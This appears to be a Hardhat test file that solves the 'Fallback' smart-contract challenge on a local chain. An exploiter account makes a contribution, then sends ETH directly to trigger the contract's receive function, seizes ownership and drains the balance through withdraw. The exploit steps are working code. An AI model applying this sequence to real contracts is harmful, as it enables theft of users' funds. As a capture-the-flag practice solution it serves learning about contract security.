import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { assert, expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { Address } from "hardhat-deploy/dist/types"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Fallback } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Fallback Exploit Testing", () => {
          let fallbackContract: Fallback
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          // run before test cases
          before(async () => {
              await deployments.fixture(["all"])
              fallbackContract = await ethers.getContract("Fallback")
              const accounts = await ethers.getSigners()
              deployer = accounts[0]
              exploiter = accounts[1]
          })

          it("fallback exploit", async () => {
              const transferAmt = ethers.utils.parseEther("0.0001")

              // contribute 0.0001 eth
              const contributeTx = await fallbackContract.connect(exploiter).contribute({
                  value: transferAmt,
              })
              await contributeTx.wait(1)

              // once done, send 0.0001 eth directly to contract
              // trigger receive fallback
              const tx = { to: fallbackContract.address, value: ethers.utils.parseEther("0.0001") }

              const txResponse = await exploiter.sendTransaction(tx)

              await txResponse.wait(1)

              expect(await fallbackContract.owner()).equals(
                  exploiter.address,
                  "exploiter a`ddress == owner"
              )

              const fallbackBalanceBefore = await ethers.provider.getBalance(
                  fallbackContract.address
              )
              expect(fallbackBalanceBefore).greaterThan(0, "fallback contract balance > 0")

              const drainTx = await fallbackContract.connect(exploiter).withdraw()
              await drainTx.wait(1)

              const fallbackBalanceAfter = await ethers.provider.getBalance(
                  fallbackContract.address
              )
              expect(fallbackBalanceAfter).equals(0, "fallback contract balance == 0 after exploit")
          })
      })
